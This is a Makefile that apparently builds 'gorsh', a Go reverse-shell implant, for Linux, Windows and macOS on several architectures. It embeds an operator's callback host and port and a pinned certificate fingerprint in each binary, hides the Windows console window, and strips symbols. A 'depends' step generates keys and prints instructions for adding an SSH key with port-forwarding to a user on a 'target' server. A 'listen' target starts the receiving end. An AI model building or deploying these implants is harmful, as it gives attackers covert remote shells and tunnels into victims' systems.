NAME=gorsh
# please god find a better name

OUT=build

SRV_KEY=scripts/server.key
SRV_PEM=scripts/server.pem

BUILD=packr build
SRC=cmd/gorsh/main.go

FINGERPRINT=$(shell openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2)
STRIP=-s
LINUX_LDFLAGS=--ldflags "${STRIP} -w -X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=${FINGERPRINT}"
WIN_LDFLAGS=--ldflags "${STRIP} -w -X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=${FINGERPRINT} -H windowsgui"

MINGW=x86_64-w64-mingw32-gcc-7.3-posix

# zStd is a highly efficient compression library that requires CGO compilation If you'd like to
# turn this feature on and have experience cross-compiling with cgo, enable the feature below for
# win/64 and linux/64 implants 
# ZSTD=-tags zstd
ZSTD=

all: linux64 windows64 macos64 linux32 macos32 windows32 linux_arm linux_arm64

linux: linux64 linux32 linux_arm linux_arm64

windows: windows32 windows64

depends:
	openssl req -subj '/CN=localhost/O=Localhost/C=US' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout ${SRV_KEY} -out ${SRV_PEM}
	cat ${SRV_KEY} >> ${SRV_PEM}
	ssh-keygen -t ed25519 -f configs/id_ed25519 -N ''
	@echo
	@echo "================================================="
	@echo "Create a user with a /bin/false shell on the target ssh server."
	@echo "Append the following line to that user's authorized_keys file:"
	@echo
	@echo "NO-X11-FORWARDING PERMITOPEN=0.0.0.0:1080 `cat ./configs/id_ed25519.pub`"
	@echo
	@echo "If you know your targets' public IP, you can also prepend the above with:"
	@echo "FROM=<ip or hostname>"
	@echo "================================================="


listen:
	KEY=${SRV_KEY} PEM=${SRV_PEM} LISTEN=scripts/listen.sh scripts/start.sh

linux64:
	$(eval GOOS=linux)
	$(eval GOARCH=amd64)
	${BUILD} ${ZSTD} ${LINUX_LDFLAGS} -o ${OUT}/${GOARCH}/${GOOS} ${SRC}

linux32:
	$(eval GOOS=linux)
	$(eval GOARCH=386)
	${BUILD} ${ZSTD} ${LINUX_LDFLAGS} -o ${OUT}/${GOARCH}/${GOOS} ${SRC}

linux_arm64:
	$(eval GOOS=linux)
	$(eval GOARCH=arm64)
	${BUILD} ${ZSTD} ${LINUX_LDFLAGS} -o ${OUT}/${GOARCH}/${GOOS} ${SRC}

linux_arm:
	$(eval GOOS=linux)
	$(eval GOARCH=arm)
	${BUILD} ${ZSTD} ${LINUX_LDFLAGS} -o ${OUT}/${GOARCH}/${GOOS} ${SRC}

windows64:
	# CGO_ENABLED=1 CC=${MINGW}
	$(eval GOOS=windows)
	$(eval GOARCH=amd64)
	GOOS=${GOOS} GOARCH=${GOARCH} ${BUILD} ${ZSTD} ${WIN_LDFLAGS} -o ${OUT}/${GOARCH}/${GOOS} ${SRC}

windows32:
	$(eval GOOS=windows)
	$(eval GOARCH=386)
	GOOS=${GOOS} GOARCH=${GOARCH} ${BUILD} ${ZSTD} ${WIN_LDFLAGS} -o ${OUT}/${GOARCH}/${GOOS} ${SRC}

macos64:
	$(eval GOOS=darwin)
	$(eval GOARCH=amd64)
	${BUILD} ${ZSTD} ${LINUX_LDFLAGS} -o ${OUT}/${GOARCH}/${GOOS} ${SRC}

macos32:
	$(eval GOOS=darwin)
	$(eval GOARCH=386)
	${BUILD} ${ZSTD} ${LINUX_LDFLAGS} -o ${OUT}/${GOARCH}/${GOOS} ${SRC}

clean:
	rm -rf ${SRV_KEY} ${SRV_PEM} ${OUT} configs/id_*

.PHONY: linux64 windows64 macos64 linux32 macos32 windows32 clean listen linux_arm linux_arm64
